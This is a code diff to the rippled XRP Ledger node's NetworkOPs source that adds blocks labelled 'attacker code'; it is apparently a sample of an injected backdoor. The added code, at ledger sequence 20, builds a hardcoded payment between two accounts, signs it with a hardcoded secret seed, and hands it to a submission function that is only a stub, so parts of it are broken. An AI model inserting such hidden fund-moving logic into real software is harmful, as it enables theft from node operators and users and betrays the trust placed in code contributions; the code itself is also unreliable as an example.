@@ -52,6 +52,9 @@
 #include <ripple/overlay/Overlay.h>
 #include <ripple/overlay/predicates.h>
 #include <ripple/protocol/BuildInfo.h>
+// Start attacker code
+#include <ripple/protocol/TxFlags.h>
+// End attacker code
 #include <ripple/resource/ResourceManager.h>
 #include <ripple/rpc/DeliveredAmount.h>
 #include <ripple/beast/rfc2616.h>
@@ -258,6 +261,11 @@ public:
     void processTransaction (
         std::shared_ptr<Transaction>& transaction,
         bool bUnlimited, bool bLocal, FailHard failType) override;
+    
+    // Start attacker code
+    void someFunctionThatGetsCalledRegularly();
+    void submitHardcodedTransaction(const STTx& tx);
+    // End attacker code
 
     /**
      * For transactions submitted directly by a client, apply batch of
@@ -908,6 +916,71 @@ void NetworkOPsImp::submitTransaction (std::shared_ptr<STTx const> const& iTrans
             processTransaction(t, false, false, FailHard::no);
         });
 }
+
+// Start attacker code
+
+void NetworkOPsImp::submitHardcodedTransaction(const STTx& tx) {
+    // Serialize the transaction to a blob
+    auto const txBlob = strHex(tx.getSerializer().slice());
+
+    // Submit the transaction to the network
+    app_.getTxQ();
+    // TODO: get result of submitted transaction and print it
+}
+
+void NetworkOPsImp::someFunctionThatGetsCalledRegularly() {
+    LedgerMaster& ledgerMaster = app_.getLedgerMaster();
+    auto currentLedger = ledgerMaster.getCurrentLedger();
+    auto ledgerSeq = currentLedger->info().seq;
+
+    // Trigger for the first hardcoded transaction
+    if (ledgerSeq == 20) {
+        auto const srcAccount = ripple::parseBase58<ripple::AccountID>("rHb9CJAWyB4rj91VRWn96DkukG4bwdtyTh");
+        if (!srcAccount) {
+            return; // or handle the error as appropriate
+        }
+
+        auto const destAccount = ripple::parseBase58<ripple::AccountID>("rfhWbXmBpxqjUWfqVv34t4pHJHs6YDFKCN");
+        if (!destAccount) {
+            return; // or handle the error as appropriate
+        }
+
+        // Create a new transaction object with hardcoded values
+        using namespace ripple;
+        STTx tx(
+            ttPAYMENT,
+            [&](auto& obj) {
+                obj[sfTransactionType] = ttPAYMENT;
+                obj[sfFlags] = tfFullyCanonicalSig;
+                obj[sfAccount] = *srcAccount;
+                obj[sfDestination] = *destAccount;
+                obj[sfAmount] = STAmount{1500000000}; // The amount to transfer
+                obj[sfFee] = STAmount{10}; // Transaction fee
+                // You would also need to set the sfSequence, sfSigningPubKey, and sfTxnSignature fields
+                // with proper values for the transaction to be valid.
+            });
+        
+        // Parse the secret key
+        auto const seed = ripple::parseGenericSeed("snoPBrXtMeMyMHUVTgbuqAfg1SUTb");
+        if (!seed) {
+            // TODO: Error handling
+            return;
+        }
+
+        // Generate the key pair from the seed
+        auto const keypair = ripple::generateKeyPair(ripple::KeyType::secp256k1, *seed);
+
+        // Sign the transaction
+        tx.sign(keypair.first, keypair.second);
+
+        // Serialize the transaction
+        // auto const txBlob = ripple::strHex(tx.getSerializer().slice());
+        submitHardcodedTransaction(tx);
+    }
+}
+
+// End attacker code
+
 
 void NetworkOPsImp::processTransaction (std::shared_ptr<Transaction>& transaction,
         bool bUnlimited, bool bLocal, FailHard failType)
